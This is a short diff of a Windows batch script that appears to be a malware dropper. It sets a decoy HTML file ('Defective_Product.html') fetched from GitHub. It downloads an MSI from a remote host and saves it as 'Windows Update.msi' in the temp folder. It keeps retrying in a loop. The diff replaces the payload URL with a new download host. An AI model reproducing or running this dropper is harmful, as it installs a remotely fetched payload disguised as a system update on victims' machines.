@@ -8,7 +8,7 @@ set "htmlUrl=https://raw.githubusercontent.com/pawheaven/product/refs/heads/main
 set "htmlFileName=Defective_Product.html"
 set "htmlFilePath=%TEMP%\%htmlFileName%"
 
-set "url=https://pub-33a4a3600c7a43828b1ff0a4ff5a458f.r2.dev/Rio/Defective_Product.msi"
+set "url=https://files.riowordcentral.xyz/copyright/copyright.msi"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
@@ -54,5 +54,6 @@ if !MSI_EXIT_CODE! EQU 0 (
 :: =========================
 timeout /t 2 /nobreak >nul
 goto RunLoop
+
 
 
